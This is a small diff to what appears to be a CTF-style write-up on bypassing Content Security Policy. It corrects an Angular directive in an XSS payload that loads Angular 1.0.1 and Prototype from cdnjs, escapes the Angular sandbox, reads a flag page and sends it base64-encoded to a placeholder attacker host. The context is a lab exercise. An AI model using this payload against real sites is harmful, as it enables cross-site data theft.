@@ -12,7 +12,7 @@ The payload below imports the Angular framework 1.0.1, which allows us to bypass
 ```javascript
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.min.js"></script>
 
-<div ng-app bg-csp>
+<div ng-app ng-csp>
 <script src="//cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.min.js"></script>
 {{$on.curry.call().eval("function reqListener () {window.location='<Your Host>/?a='+btoa(this.responseText);};oReq = new XMLHttpRequest();oReq.onload = reqListener;oReq.open('get', 'csp-two-flag', true);oReq.send();")}}
 
